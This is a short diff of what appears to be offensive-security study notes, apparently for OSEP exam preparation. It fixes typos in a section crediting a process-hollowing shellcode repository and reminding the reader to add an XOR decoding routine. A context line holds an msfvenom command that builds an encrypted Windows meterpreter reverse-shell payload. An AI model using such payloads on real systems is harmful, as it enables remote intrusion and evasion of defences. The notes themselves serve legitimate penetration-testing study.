@@ -7,8 +7,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 --encrypt x
 ```
 
 ## Process Hollowing:
-Credi: (https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Hollowing)
-Make sure you add the decoding routine with the byte that you generated. In this case it is x6A
+Credit: (https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Hollowing).
+
+Remember to dd the decoding routine with the byte that you generated. In this case it is x6A.
 ```
 ﻿using System;
 using System.Runtime.InteropServices;
